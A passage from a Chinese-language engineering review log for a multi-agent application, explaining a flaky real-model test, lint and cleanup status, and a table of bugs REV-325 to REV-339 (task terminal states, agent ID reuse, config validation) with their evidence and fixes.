**那 1 个失败必须解释，不能带过**：`Tests/AgentRuntime/realAgent.spec.ts` 的 **Round 3**（真实模型）在第二次调用处断言 `response2.ok` 失败，日志给出的真实原因是 `[retry 中止] 已耗时 125029ms，剩余预算不足以完成下一次尝试（budget=180000ms）→ 直接回传真实失败原因：请求已取消`——即**上游一次回答超过 60s 墙钟**（`Configs/modelRouter.json` 的 `timeoutMs:60000`，非流式内部调用的唯一挂钟点），重试包装按 REV-325 的预算制正确中止并回传了真实原因，坏的是那条 60s 上限本身。这正是**同日已登记、明确未修的 REV-326**（归 P1-3/P2-4），与本批改动无因果：P1-8 没有改 `modelCaller`/`openaiProvider` 的超时路径，而 Round 1/2 与"综合"在同一轮里都通过。同文件此前两轮收口时也是同一条用例最先抖动（P0-4 记录里 Round 3 曾耗时 75.04s，贴近 125s 中止线），故本批把它按**已归因的环境性失败**记录，不当作回归，也不为了凑绿灯去放宽断言。**单跑复验**：随后单独执行该文件（`npx vitest run Tests/AgentRuntime/realAgent.spec.ts -t "Round 3"`）为 **3 passed / 1 skipped**——注意 `-t` 这次并**没有**把其它用例过滤掉，实际真跑了 Round 1/2/3 三条且全部通过，**Round 3 用时 84.881s**（未撞上 60s 墙钟），第四条被跳过。也就是说同一条用例**脱离整文件并发上下文后通过**，全量那一跑撞上的是上游一次回答超过 60s 的抖动，形态与 REV-325 记录的"连着跑红、单跑绿"同源，只是触发点换成了墙钟上限；因此**不另立条目**，仍归 REV-326（P1-3/P2-4）。

**Lint 口径**：`eslint Src/` **0 error / 319 warning**（§16.11 基线 323）。本批曾一度到 324（新增 `taskDriver.ts` 与 `agentExecutor.ts` 的 import 分组各引入 `import/order`），处理办法是把**本批改动的三个文件**（`taskDriver.ts`、`agentExecutor.ts`、`contextCompression.ts`）就地 `--fix` 掉这 5 处分组/空行问题，于是净减 4 条——不是全局 `--fix`（其余 314 条属既有风格债，与 REV-289 的 CI lint 议题同批处理，不在本工单里顺手改）。**时序（诚实）**：上面那次全量跑发生在 `--fix` **之前**；`--fix` 之后复跑根 `tsc --noEmit`（0 输出）与两条定向用例 `taskDriverChain` + `toolMessageAssembly`（**16/16**）确认无破坏——改动内容只是 import 分组顺序，不动语义。

**现场清理**：三轮各自按监听 PID 停进程（`netstat -ano -p tcp` + `Stop-Process -Force`），三轮的清理记录均为 `端口监听PID: 0`（`:3000` 已释放）；**三轮的 `Configs/local.json` 都是 `<ABSENT>`**——本批评测不需要改任何配置，所以既没有写盘也没有删盘，不存在凭据落盘的可能。全程只监听回环。第三轮在库里留下的终态行（`task-f1d3d3e6` 的 `tasks`/`subtasks`/3 行 `destroyed` agents）**未手工删除**；历史 7 个 `trace-exec-*` trace / 8 行孤儿同样保留（口径同 REV-336——删库行不可逆且抹掉审计痕迹）。所有改动仍未提交。

**遗留边界（不在本工单收口）**：① REV-345 的 ②③（单轮约 20.8 万 token 的用量统计口径 + "任务书预算 vs `loopDefaults` vs `LOOP_LIMITS` 硬上限"的优先级）→ **P1-5**，这是"成功侧端到端"的前置；② **REV-348**（迭代内阻塞审批 × 串行后台队列）未修，需产品口径；③ **REV-342**（`agents` 行与内存状态漂移）是权威归属问题 → P2-2；④ **REV-343**（测试侧 import 大小写漂移）需一次 Linux 实跑 + CI 门禁 → P0-3 残留；⑤ "成功任务落 `completed`"与"评审面端到端"两项**仍未取证**（见上诚实边界），复验点在 P1-5 之后重跑本批同一脚本即可（脚本已不再需要人工驱动）；⑥ 聊天路径（非 DIRECT 经 `yieldToOrchestrator` 转后台）与 Electron GUI 冒烟仍需人工点按（§16.4）。

## 17. 修复期间新增登记（P0 批次真实取证时发现）

评审轮次已收口（§16.1），以下条目是**修复过程中用真实运行取证时新发现**的，按同一口径登记后随即处理，不回灌既有条目。

| REV | 严重 | 维度 | 证据（file:line） | 现象 → 影响 → 修复 | 状态 |
|---|---|---|---|---|---|
| REV-325 | 高 | 可观测性/测试串扰 | `Tests/AgentRuntime/realAgent.spec.ts:49-70`（重试包装）↔ `Src/Infra/Llm/Router/modelRouter.ts` `timeoutMs` | **真实模型用例的退避重试没有墙钟预算**：4 次尝试 × 60s + 30s 退避 ≈ 270s，而用例超时最小 60s、Round 3 只有 180s → 用例在 `await` 中途被强杀，只报 `Test timed out`（分不清"供应商慢"还是"逻辑坏"）。更糟的是**迟到的续体**在下一个用例 `fullReset()` 之后继续执行 `submitForReview`，把 `getPendingReviewCount()` 从 2 改成 3 → 单独跑"综合"必过、连着跑必假报业务断言失败（实测：整文件跑 2 红 / 单跑 `-t "综合"` 绿 / 单跑 `-t "Round 3"` 74s 绿）。影响：全库回归出现不可解释的红，直接违反 §16.6"不能带着未解释的失败收口"。修复：重试改**墙钟预算制**（剩余预算放不下"退避 + 一次最坏尝试"即中止并回传真实原因），用例超时上调至满足不变式 `超时 > 调用次数 × (RETRY_BUDGET_MS + 单次上限)` | ✅真实取证(2026-10-08) · ✅已修复(2026-10-08)：实测中止日志 `[retry 中止] 已耗时 60011ms，剩余预算不足以完成下一次尝试（budget=120000ms）→ 直接回传真实失败原因：请求已取消`；预算最终按实测定为 **180s**——120s 时一次 60s 超时后不再给重试机会（60+5+60=125>120），等于把供应商抖动放大成用例失败，反而比旧实现更脆 |
| REV-326 | 中 | 业务/体验 | `Configs/modelRouter.json:50` `timeoutMs:60000`；`Src/Core/Model/modelCaller.ts:74-76`（非流式路径唯一挂墙钟超时处）；`callModelStream`(:130-156) 无任何墙钟超时 | **60s 墙钟上限只压住"非流式内部调用"**：真实运行中一次 `max_tokens:400` 的长回答确实超过 60s → `openaiProvider.ts:131` 回 `请求已取消`。聊天主链路走 `callModelStream`（只有首字节/块间超时，无墙钟），所以受影响的是 **L3 Judge、上下文压缩、摘要**这类一次性非流式调用——长成果被 60s 掐断时，Judge 侧等于"判不了"，压缩侧等于"静默降级"。与 REV-025 是同一开关的两面（那条讲"传了外部 signal 就关掉 60s"，本条讲"60s 本身对长上下文内部调用过紧"），故单立而不并入 | △真实取证(2026-10-08，取自 P0-2 回归轮) · 未修复（建议归 P1-3/P2-4：按用途分档超时，内部调用放宽至 120~180s 或可配） |
| REV-327 | 低 | 可观测性/运行形态 | `electron/main.ts:115`（`app.setName('CivitasAI')`）、`:158-164`（`setPath('userData')` + 回落探针）；实测取证自 `Scripts/probePackagedBackend.cjs` 对 `release/win-unpacked` 的两轮探针日志 | **打包态每次启动刷 9 条 Chromium ERROR，但都不是业务错**：`net\disk_cache\cache_util_win.cc:25 Unable to move the cache: 拒绝访问。(0x5)` ×3、`disk_cache.cc:290 Unable to create cache` ×3、`gpu\ipc\host\gpu_disk_cache.cc:737 Gpu Cache Creation failed: -2` ×3。根因已取证：`%APPDATA%\civitas-ai`（改名前的默认 userData，内含 `Cache/Code Cache/GPUCache`）与 `%APPDATA%\CivitasAI`（现路径）**同时存在**，profile 目录被换名后 Chromium 尝试"搬移"旧缓存被系统拒绝，于是 GPU/磁盘缓存整块失效——影响是渲染性能降级 + 错误日志被固定噪声占据（真故障会被淹在里面对，`Logs/business.log` 本次实测零 ERROR/WARN，噪声只出现在 stdout），另外 legacy 目录里的旧 `Local Storage`/凭据残留无人清理。`pickUserDataDir()` 的四步探针（建目录→子目录→写文件→清理）抓不到这一类"移动被拒"，因为失败发生在探针之后、Chromium 自己的搬移路径上 → 建议：一次性迁移并删除 legacy `civitas-ai` 目录（或显式 `setPath('sessionData')`/`--disk-cache-dir` 指向 userData 内），并在启动日志里把这组噪声降级为 warn | △真实取证(2026-10-09，P0-3 探针轮，两轮复现) · 未修复（建议归 P2-4） |
| REV-328 | 高 | 已接线但无人读（伪生效） | `Client/src/config/configSchema.ts:54-59`（设置页摆出 `loopDefaults` 六键）↔ `Src/main.ts:683,783`（全库只读 `loopDefaults.token_budget`）↔ `Src/Core/Loop/loopConfig.ts:20-27`（`DEFAULT_LOOP_CONFIG` 硬编码 30/60000/0.2/100000/stream）+ `:122-127`（`createRoleLoopConfig` 基线是它，不是配置）| `loopDefaults.max_iterations` / `timeout_ms` / `temperature` / `stream` / `model` 五键**可写、可落盘、重启后 `running` 里确实是新值，但运行态从不以它们为基线**：LoopConfig 由硬编码默认 + `roleOverrides` 合成。真实取证（2026-10-08，P0-4 重启闭环）：写 `loopDefaults.max_iterations=42` 并重启 → `GET /api/configs/effective` 的 `running` 显示 42；而真正进 `StopRuleSet` 的那把闸读的是 `stopRules.limits.maxIterations`（`main.ts:689`，同一批次写 47 后重启确实变成 47）。用户视角是"我把默认最大轮次调到 42，Loop 仍在 30 轮停"——与 REV-265 同族（写进去了 ≠ 生效），且比 265 更隐蔽：**写路径与读路径都真实工作，只是两端没接上**。修复方向：新增 `setLoopDefaults()` 由 `main.ts` 在启动时注入配置、`DEFAULT_LOOP_CONFIG` 退化为兜底常量；或者把这五键从白名单与设置页撤下，让 `roleOverrides` 成为唯一入口（二者必须择一，不能维持现状）| ✅真实取证(2026-10-08) · 未修复（建议归 P1-4：与"未接线控件"同批处理） |
| REV-329 | 中 | 启动时序竞态 | `Src/Interface/IpcBridge/ipcBridge.ts:485`（`void restoreProvidersFromSecrets()`）↔ `Src/main.ts:891-915`（`startHttpServer` 先于 `await startIpcBridge()`）↔ 本工单 P0-4 新语义：`ipc-update-routing` 把 `routing.*` 写进 `Configs/local.json` | 路由配置现在会**跨重启保留**，而"用户手工添加的供应商"要靠启动时从加密存储恢复注册；恢复是 `void` 发射后不管，于是存在一个窗口：新进程已按持久化路由选中 `my-provider/gpt-x`，但 `restoreProvidersFromSecrets()` 尚未完成注册 → 首批模型调用报"未知供应商"，且失败原因对用户完全随机（同样的操作，快一点就坏）。加重因素：`ipc-add-provider` 里的持久化同样是 `void upsertProviderSecret(...)`——写入失败只 warn，用户已看到"添加成功"。修复方向：把恢复纳入就绪门（`System ready` 之前 `await`，或让模型调用在恢复完成前排队），并把 `upsertProviderSecret` 的失败回传给 IPC 调用方而不是只落日志 | △真实取证(2026-10-08，代码路径三段一致；竞态窗口未实跑复现) · 未修复（建议归 P1-2） |
| REV-330 | 中 | 安全可用性/自助锁门 | `Src/Infra/Config/userConfigWriter.ts:41`（`server.allowRemoteAccess` 在白名单，UI 可写）↔ `:NEVER_WRITABLE`（`server.apiToken` 界面永不可写）↔ `Src/Interface/WebServer/apiToken.ts:189`（`bootstrapEnabled = !remoteEnabled`，开远程即关闭领取通道）↔ `Src/Infra/Config/configValidator.ts:52-59`（只分别校验类型与长度，**不校验二者配对**）| 在设置页把 `server.allowRemoteAccess` 改成 `true` 会被 `applied` 接受、写入 `Configs/local.json`，写入时没有任何前置条件提示；重启后 `resolveBindHost` 绑非回环 + `initApiToken` 生成随机令牌 + 领取通道 fail-closed 关闭 → **浏览器形态用户把自己锁在门外**，唯一的出路是手工编辑配置文件补 `server.apiToken`（而 401 的提示语正是这么写的，等于承认界面走不到）。安全方向是正确的（门不会被绕过，Electron 形态仍由主进程经 IPC 拿到令牌），坏在体验与可解释性：一次看似普通的开关 + 一次正常重启 = 界面全 401 且无从回滚。修复方向：`validateCandidate` 增加配对规则——`allowRemoteAccess=true` 且当前生效配置里没有可用 `server.apiToken` 时返回 `invalid`（"开启远程访问前必须先设置 server.apiToken，否则重启后无法登录控制面"），并在设置页把该项标为需重启 + 双人确认 | △静态取证(2026-10-08，四段代码路径一致) · **原登记两处前提已被真实取证更正**：① 触发面不是"设置页开关"——`Client/src` 全库没有 `server.allowRemoteAccess` 控件（§14.3 核对表可查），可写面是 `PUT /api/configs/user`；② 自我锁门需要**三条件同时成立**（`server.host` 非回环 **且** `allowRemoteAccess=true` **且** 无 ≥16 字符 `apiToken`）——`bindPolicy.resolveBindHost` 对回环宿主一律算出 `remoteEnabled=false`，于是 `bootstrapEnabled=!remoteEnabled` 仍为真，只开开关不改宿主不会关门（`.tmp/p17-real-evidence.out` 12/15/16 段：回环下写 `allowRemoteAccess=true` 被 `applied`，真实重启后领取令牌 200、带令牌读配置 200）。 · ✅已修复(2026-10-09，P1-7a)：`remoteAccessPairingReason()` 把同批 host+开关合起来判定，且以**候选态**（含已落盘的上一批）判定，按项回 `invalid` 并给出"先设置 server.apiToken"的补救路径；真实取证——非回环无凭据的写入 `applied=[]`、两个路径都进 `invalid`、`Configs/local.json` 保持不存在；真实重启（按监听 PID 停止 23448 → 新进程日志出现"服务已启动" → 领取令牌 200）后再次单写 `server.host=0.0.0.0` 仍被拦（跨请求配对生效）。残留：Settings 里仍无该项控件，界面文案与双人确认归 P2-2 |
| REV-331 | 中 | 配置写路径/形态 | `Src/Infra/Config/userConfigWriter.ts:157-169`（`validateShape` 只看**待写入值**的形态，从不与基线里同路径的既有值比对）↔ `:208`（`deepMerge` 的 else 分支：非"对象覆盖对象"时**直接整体替换**）↔ `Tests/Infra/userConfigWriter.spec.ts:111`（既有用例注释已把这一点写成"当前会被放行"的已知现状）| `supervision.rateLimit` 这类"对象段"可以被界面/接口用一个标量整体覆写：`PUT /api/configs/user {patch:{'supervision.rateLimit':1}}` 实测回 `{"ok":true, "applied":["supervision.rateLimit"]}`，磁盘上该段由 `{...多个子键}` 变成 `1`，段内其余子键从此消失。启动校验只按路径逐键查类型，读到标量便**整段跳过**（不报错），于是表现为"设置项写进去了、界面也显示已生效，但那一整块行为悄悄失效"。属于 REV-265/328 同族（写路径与读路径没接上），但破坏面更大：一次写入抹掉一整段。修复方向：`validateShape(value, baselineValue)` 增加形态配对——基线是对象而候选是标量时返回 `invalid`（"该配置项是一个配置段，只能逐子键写入"），基线是标量而候选是对象时同样拒绝，避免 `deepMerge` 走替换分支 | ✅真实取证(2026-10-08，P0-4 写路径探针) · ✅已修复(2026-10-09，P1-7a)：`validateShape(value, baselineValue)` 与基线同路径比对，基线为对象段而候选为标量/数组时按项回 `invalid`（"该项是一个配置段（含 N 个子键），只能逐子键写入…"）。真实取证（`.tmp/p17-real-evidence.out` 13 段）：同批写 `supervision.rateLimit=1` / `economy.tax=['a']` / `stopRules.budget=1` / `ui.dashboardPollIntervalSec=11`，回执 `applied=["ui.dashboardPollIntervalSec"]` + 三条 `invalid`（子键数 4/8/4 与实际段一致），`Configs/local.json` 里只多出 `ui.dashboardPollIntervalSec`，三个对象段在磁盘上未被替换；逐子键写法（`supervision.rateLimit.maxRequestsPerMinute`）仍放行 |
| REV-332 | 高 | 业务/持久化（跨进程 ID 复用） | `Src/Core/AgentRuntime/agentFactory.ts:22`（`agentCounter` 是**进程内存量**）↔ `Src/Core/AgentRuntime/agentRegistry.ts:101`（`hydrateAgents()` 启动回灌未销毁行）↔ `:138`（`registerAgent` 撞名即 `err('Agent X 已注册')`）↔ `Src/Infra/Db/Repositories/agentRepository.ts:68`（`ON CONFLICT(agent_id) DO UPDATE`）↔ `Src/main.ts:320`（启动确实调用了回灌）| 真实后端里 `POST /api/tasks` 提交的**每一条**任务都失败，任务面板回执是 `Agent agent-prime_director-1 已注册`。取证：`Logs/business.log` 有 `路由决策由…决定` 紧接着任务 `failed`；`Data/db/civitas_main.db` 的 `agents` 表里 `agent-prime_director-1`/`-4` 等 `destroyed_at IS NULL` 的行还在（`total 6 / alive 4`）。链条：重启 → 回灌把历史实例装进内存 → 计数器从 0 起 → 首次 `createAgent` 分配到同名 ID → 注册被拒 → 编排第一步返回错误。已销毁行更隐蔽：不在内存，于是写透 upsert 按 `agent_id` **覆盖历史审计行**。与 `memory_id`、共享工作区 ID 的既有做法（启动回灌时恢复计数器）属同一类缺陷，Agent 侧漏了。修复：`nextAgentId()` 首次分配前用 `maxAgentIdSeq()`（含已销毁、跨账号）顶高计数器，并对内存已占用 ID 继续避让 | ✅真实取证(2026-10-09，`.tmp/p04-mode-evidence.mjs` + `.tmp/p04-mode-why.mjs` + 库内 agents 行) · ✅已修复(2026-10-09)：同一取证实跑复跑，`DIRECT`/`DELEGATION` 两条任务均 `completed`、`result={"status":"success","routingMode":"DELEGATION"}`；回归 `Tests/AgentRuntime/agentIdReuse.spec.ts`（真实库模拟重启 3 例） |
| REV-333 | 中 | 可观测性/数据一致性 | `Src/Core/Decision/orchestrator/orchestrator.ts`（`receiveTask` 三个失败分支此前 `return` 而不记日志）↔ `:237`（`upsertTask(... status:'running')` 落库后无人回写）↔ `Src/Interface/RestApi/taskApi.ts:73-77`（失败只写进**进程内存** `tasks` Map）| 一次编排失败：日志里**零痕迹**（实测 `Logs/business.log` 在失败任务后没有任何 error 行），`tasks` 表那一行永远停在 `running`、`final_result` 为 `null`（实测库内 4 行全是 `running`），只有内存 Map 知道它失败了 → 进程一重启，失败记录连同原因一起消失，任务面板与 Agent 监控里看到的是"永远在跑"。修复（失败侧）：评估/路由/执行三段失败各记 `logger.error`（带 stage/taskId/traceId/mode/error），落库后的失败同时把任务行回写为 `failed` 并带上原因。**残留**：`executeDirect` 成功返回时同样不写终态（DIRECT 无计划、不走 `finalizeOrchestration`），成功任务在库里仍是 `running` → 归入下一条一并处理 | ✅真实取证(2026-10-09，失败复跑 + 库内 tasks 行) · ✅已修复(2026-10-09，P1-7b 补齐成功侧)：`executeDirect` 现在登记一个 `assignmentId = taskId` 的单赋值 `TaskPlan`（`DIRECT_MAX_ITERATIONS = 20`），DIRECT 与其余模式一样只能由 `finalizeOrchestration` 落终态；`submitTask` 返回的 `result` 改为派发态 `{status:'dispatched', routingMode, assignmentCount}`。取证：`Tests/Interface/taskTerminalAuthority.spec.ts`（真实迁移库 + 真实编排 + 真实 ID 空间，DIRECT 未收终态时行必须仍为 `running`）；真实 HTTP 侧的"未收终态不得显示已完成"见 §16.11（`.tmp/p17-real-evidence.out` 20 段）。**真实进程里"成功落终态"这一半仍未取到**——链路被 REV-338（无执行驱动）与 REV-341（提供方 400）挡住，收口口径见 §16.11 |
| REV-334 | 中 | 业务语义/体验 | `Src/Interface/RestApi/taskApi.ts:61-78`（`queueMicrotask` 里 `receiveTask` 一返回就置 `completed`）↔ `Src/Core/Decision/orchestrator/orchestrator.ts`（DELEGATION/ASSEMBLY_LINE/CONSORTIUM 的 `receiveTask` 只到"计划已派发/聚合已完成"，子任务由事件驱动继续跑）| 多 Agent 模式下"已派发"被当成"已完成"：HTTP 201 之后几毫秒任务卡就变绿（`completed`），随后子 Agent 的真实成败**没有任何后续回执**（内存记录不再被更新，除非有人再 `hydrate`）。用户在任务面板看到"已完成"却拿不到结果，`result` 里只有一句 `{status, routingMode}`。P0-4 把对话流的非 DIRECT 工作方式也接到这条路上（`ipcBridge.yieldToOrchestrator` 的回执正指向任务面板），所以这条现在会直接面向用户。修复方向：状态机口径按"submitted/planning/running/awaiting/终态"细分，终态只由 `finalizeOrchestration`/`TASK_COMPLETED` 事件驱动；`submitTask` 返回的应是派发态而不是 completed | ✅真实取证(2026-10-09，两条任务的 completed 均在提交后 1.5s 内到达，子任务日志随后仍在继续) · ✅已修复(2026-10-09，P1-7b)：口径改为**`tasks` 表是终态权威、内存 Map 只是本进程的派发缓存**——`submitTask` 只写派发态，读侧 `withAuthoritativeState` 在返回前用库里的终态覆盖内存（`GET /api/tasks`、`GET /api/tasks/:taskId`、以及**先映射后筛选**的 `?status=`；此处首稿写成"先按内存状态筛再覆盖"，会让"库里已 completed"的任务在筛选时直接被剔除，被新增用例抓到后修正），库不可用时如实保留内存视图而不是假称终态；`DELETE /api/tasks/:taskId` 取消只落 `cancelled` 终态、不中断已在跑的 Loop（诚实边界）。真实取证（`.tmp/p17-real-evidence.out` 20/21/24 段）：提交 DELEGATION 后视图与行都是 `running`、`result.dispatched.assignmentCount=2`、`subtasks` 两行 `assigned`；修复前基线是"库里 10 行全 `running`、内存说 completed"。残留：终态事件本身在真实进程里尚无发布者（REV-338/339/341），`awaitingApproval` 等中间态未细分，归后续批 |
| REV-335 | 中 | 交互逻辑/静默行为变更（接线时引入） | `Client/src/stores/eventStore.ts`（接线前的 `MAX_EVENTS=1000` + `TRIM_TO=500` 两级策略）↔ 接线首稿（`next.length > max ? slice(-max)` 单一硬上限）↔ `Configs/default.json:28`（`ui.maxEventBufferSize: 500`）↔ `Tests/AIComponents/eventStore.spec.ts:58,77`（既有两条用例分别锁住"1001→留 500"和"恰好 1000 不裁剪"）| P0-4 把事件缓冲接到 `ui.maxEventBufferSize` 时，只把配置值当成"硬上限"读，**把原有的两级批量裁剪语义改成了每推一条都可能切片并只保留 N 条**：出厂配置 500 ⇒ 缓冲实际容量从 1000 缩到 500，用户在事件流里能回看的窗口被无声砍半，且切片频率上升（每条 push 都判并可能 slice）。全量单测把它抓住（`expected length 1000 but got 500`）——**这是本轮唯一由既有测试拦下的自伤回归**，说明"接线"必须逐字段核对旧语义，不能按字段名字面猜。修复：把配置值明确定义为**超限时保留的条数**，触发点仍是它的 2 倍（默认 500 ⇒ 触发点仍为 1000，与接线前完全等价），并把 `configSchema` 的说明从"超限丢最旧"改成"缓冲涨到 2 倍时一次性裁剪到最新 N 条"，避免面板承诺消费端不做的语义；补一条用例用 `overrides` 把上限设成 60，证明这个值**真的被读**（只测默认值无法区分"接了线"与"巧合相等"）| ✅真实取证(2026-10-09，全量 `vitest run Tests` 首跑 1 failed / 1850 passed) · ✅已修复(2026-10-09，复跑 157 文件 / 1852 用例全绿) |
| REV-336 | 低 | 资源生命周期/体验 | `Src/Core/Decision/orchestrator/orchestrator.ts:273`（`executeDirect` 建 Director 后既不 `unregisterAgent` 也不销毁）↔ `Src/Infra/Db/Repositories/agentRepository.ts`（软销毁仅 `unregisterAgent` 路径写 `destroyed_at`）| 编排结束后 Agent 实例既不回收也不落终态：实测 `agents` 表里留下 `agent-prime_director-5 status=running`、`agent-worker-7 status=running`、`agent-prime_director-6 status=ready` 这类"幽灵行"，`destroyed_at` 全为 `null`。后果是 `hydrateAgents()` 每次重启把它们降级成 `suspended` 再装回内存，Agent 监控列表越用越长且看不出哪些属于哪个任务，`getReadyWorkers()` 也可能把上一任务的 Worker 当可用产能复用 | △真实取证(2026-10-09，库内 4 行存活状态与本次两轮提交对应；是否会被后续招募复用未实跑验证) · ✅已修复(2026-10-09，P1-7b)：`finalizeOrchestration` 在发布汇总事件**之前**调用新增的 `releaseRunAgents(plan)`——对计划里每个 `agentId` 走 `handleAgentEvent(id, {type:'DESTROY'})` + `unregisterAgent(id)`（后者写 `destroyed_at`，即软销毁、保留审计行），DIRECT 也因 REV-333 的单赋值计划同样被覆盖，并记 `编排收尾已回收 Agent` 日志。取证：`Tests/Interface/taskTerminalAuthority.spec.ts` 断言编排后 `countLiveAgentsByTrace` 由 1→0（DIRECT）与 3→0（DELEGATION）且每行 `destroyed_at` 非空。**边界（诚实）**：真实 HTTP 进程里"编排结束"本身尚未发生（无执行驱动，见 REV-338），故回收只在真实迁移库+真实编排代码的路径上取证，未在 `:3000` 进程里取到；本轮取证自身仍在库里新增 2 行 `status=running AND destroyed_at IS NULL`（`task-348ec0a2`/`task-8bbb3283` 的 Worker，基线由修复前 10 行增至 12 行），属同一缺口而非新缺陷。另有 `/execute` 用 `trace-exec-*` 造成的第四类孤儿行，登记为 REV-340。AgentMonitor"看出属于哪个任务"的呈现归 P2-2 |
| REV-337 | 低 | 日志可观测性/信号噪声 |  `Src/Infra/Db/Repositories/agentRepository.ts:122,156,202`（三条 `logger.error` 只在 `getMainDb()` 抛错时触发）↔ `Tests/AgentRuntime/realAgent.spec.ts:157-160`（`fullReset()` 重置全部注册表，**从不调用 DB 初始化**）↔ `Src/Infra/Db/index.ts`（未初始化即抛）↔ `Src/Infra/Db/Repositories/agentRepository.ts:217`（同文件 `countLiveAgentsByTrace` 对同一情形是 `catch {}` 静默返回 0）| 真实 Agent 三轮跑（`.tmp/p04-realagent.log`）单文件即 9 行 `[ERROR] Agent 落库失败` / `Agent 更新落库失败` / `Agent ID 序号载入失败（按 0 处理，ID 可能复用）`，全量跑 165 行，而**用例本身 4/4 通过**。后果不是功能错，是信号被淹没：`Logs/business.log` 与测试输出里"真的落库故障"（磁盘满、迁移未跑、约束冲突）与"测试环境根本没有库"长得一模一样；而 §16.6 的收口口径要求"零 ERROR"，这类噪声要么让人误判失败，要么让人干脆放弃看日志。`maxAgentIdSeq()` 在纯内存场景返回 0 是**设计内**行为（无历史行可撞，注释已写明），但沿用了 error 级；同模块三种写法并存（error / warn 降级 / 静默）| ✅真实取证(2026-10-09，三轮 realAgent + 全量跑行数统计) · 未修复（建议归 P1-3：与"错误与日志呈现口径"同批——识别"库未初始化"为可预期状态并降为 warn-once 或加 `isDbReady()` 前置判断，同时让 realAgent harness 显式声明自己跑在纯内存模式） |
| REV-338 | 高 | 业务/链路断裂（派发了但没人执行） | `Src/Core/Decision/orchestrator/orchestrator.ts:477,564,641`（三个模式都发布 `task:assigned`）↔ 全库 `Src/` 与 `electron/` **没有任何 `subscribe(EventType.TASK_ASSIGNED)`**（grep 只命中发布方与枚举定义）↔ `Src/Core/AgentRuntime/agentExecutor.ts:37`（唯一的执行入口 `executeAssignedTask`）只被 `Src/Interface/RestApi/agentApi.ts:53` 一个手工端点调用 ↔ `Src/Tools/Custom/submitForReview.ts:24`（`agent.submit_review`）只有"模型在 Loop 里自己调用工具"这一条入口，REST/IPC 没有任何路由可达（`approvalApi.ts:81` 的 `GET /api/reviews` 明确标 `readOnly: true`，评审裁决不走人工通道）| 现象：真实后端提交一条 DELEGATION 任务后，`subtasks` 两行永远 `assigned`、两个 Worker 的 `agents` 行永远 `running`、`tasks` 行永远 `running`（`.tmp/p17-real-evidence.out` 20/21/24 段与 `.tmp/p17-review-evidence.out` 21/22 段，两个进程、四个任务号复现）。影响：REV-334 修的是"读侧不得假称完成"，但**写侧的完成本身在生产链路上不可达**——本批验收口径 ④（成功任务落终态）与 ⑤（编排结束回收 Agent）因此只能在"真实迁移库＋真实编排代码"的进程内路径取证，无法在 `:3000` 进程里端到端跑通；用户视角是"任务永远在跑"。这不是本批引入的，是 P0-4 把 UI 接到编排之后才第一次面向用户暴露的既有缺口。修复方向（需产品口径先定，不能顺手补）：要么在 Core 侧加 `task:assigned` 订阅者把派发转入异步执行队列（并处理并发与预算），要么在 Client 侧把 `POST /api/agents/:id/execute` 做成显式可见的"驱动执行"动作并在任务卡上标注"等待执行"——**二者都必须同时解决评审入口**，否则执行成功仍然产生不了 `assignmentId` 级 `TASK_COMPLETED` | ✅真实取证(2026-10-09，两个独立进程、四个任务号复现：`subtasks` 永停 `assigned`、Worker 与 `tasks` 行永停 `running`) · ✅已修复(2026-10-09，P1-8，取前一种口径)：新增 `Src/Core/Decision/orchestrator/taskDriver.ts`——`task:assigned` 的 **FIFO 串行执行队列**（不并行，保证 ASSEMBLY_LINE 的顺序语义，也不会让多个 Worker 同时抢同一份预算）。三条设计约束：① 只消费**带 `assignmentId`** 的派发侧事件（`agentRuntime.assignTask` 是第二个发布方，载荷只有 `agentId/taskId`，不判就会重复执行）；② 按 `assignmentId` 幂等去重；③ 执行参数从事件载荷取 `instruction`/`maxIterations`/`tokenBudget`（见 REV-345①）。装配点在 `Src/main.ts` ⑫.7 `initTaskDriver()`，**Core 侧不自接线**——单测直调 `receiveTask` 不会驱动真实 Loop。真实取证见 §16.12：一次 `POST /api/tasks` 之后全程无人工驱动，两个 Worker 由产品自己跑完、台账落终态、Agent 被回收 |
| REV-339 | 高 | 业务/终态（失败侧永不收尾） | `Src/Services/EventBus/eventTypes.ts:19`（`TASK_FAILED = 'task:failed'`）↔ `Src/Core/Decision/orchestrator/orchestrator.ts:86`（订阅 `TASK_FAILED` 进 `handleAssignmentTerminal`）↔ `Src/Services/LoopControl/.../progressTracker.ts:59-68`（同样订阅，只 `failures++`）↔ **`Src/` 全库没有任何位置发布 `EventType.TASK_FAILED`**（grep 命中只有枚举、订阅、以及 `Tests/EventBus/eventBus.spec.ts` 自己发布）↔ `Src/Core/AgentRuntime/agentRuntime.ts:153-157`（评审**拒绝**分支只 `worker.consecutiveFailures++`，不发任何终态事件）| 现象：一个多 Agent 计划里只要有一个子任务失败（或评审被拒后再没重提），`allAssignmentsTerminal` 永不为真 → `finalizeOrchestration` 永不被触发 → `tasks` 行与所有 `agents` 行一起停在运行态，且 `result` 里那句汇总统计（total/success/failed/partial）永远不会出现。影响：REV-334 的权威口径在失败路径上是空转的，任务面板只会显示"执行中"；失败原因只活在 `progressTracker` 的内存计数里，进程重启即消失。修复方向：Loop 的非可恢复失败、评审拒绝后达到重试上限、Agent 被驱逐三处都要发布带 `assignmentId` 的 `task:failed`；同时 `finalizeOrchestration` 需要能接受"部分失败"的终态而不是等全部成功 | ✅真实取证(2026-10-09，全库 `EventType.TASK_FAILED` 零发布者——grep 只命中枚举定义、两处订阅与测试自发布) · ✅已修复(2026-10-09，P1-8)：补齐三处发布者——① `agentRuntime.reviewSubmission` **拒绝**分支发布 `task:failed`（载荷 `taskId`/`assignmentId`/`workerAgentId`/`reviewId`/`reason`，与通过侧对称，此前只 `consecutiveFailures++`）；② `agentExecutor.executeAssignedTask` 在 Loop 回不可恢复失败时发布；③ 同处在"循环结束但未提交评审"时发布（真实进程里最常见的终态来源，`reason` 带 `exitReason`/迭代数/末轮输出摘要）。`progressTracker` 的 `TASK_FAILED` 处理同时落 `status='failed'`（原只 `failures++`，而 `allAssignmentsTerminal` 判的是 completed/failed，故永不收尾）。`finalizeOrchestration` 侧无需改动即接受部分失败（聚合出 `_summary` 并把 `tasks` 落 `failed`），已真实取证见 §16.12。残留：评审被拒后的**自动重派/重跑**仍未实现（只落终态，不重试），与"Agent 被驱逐"发布者一并归 P2-x |
